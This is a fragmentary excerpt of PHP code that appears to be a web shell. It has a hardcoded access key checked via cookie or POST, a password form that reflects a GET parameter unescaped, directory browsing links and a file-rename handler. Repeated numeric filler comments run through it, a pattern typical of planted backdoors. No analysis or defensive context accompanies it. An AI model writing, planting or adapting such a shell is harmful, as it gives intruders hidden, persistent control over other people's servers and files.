...
$auth_key = "a1a846522d328998aecb2266bf550de0";
...
$pass = false;
if (isset($_COOKIE['pw_name_78849'])) {
    if(($_COOKIE['pw_name_78849']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_78849'])) {
        if(($_POST['pw_name_78849']) == $auth_key) {
            setcookie("pw_name_78849", $_POST['pw_name_78849']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_78849' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1724535023112698 1724535023246428 1724535023742268 1724535023925047
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1724535023112698 1724535023246428 1724535023742268 1724535023925047
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1724535023112698 1724535023246428 1724535023742268 1724535023925047
            $name = PATH . "/" . $_GET['r'];
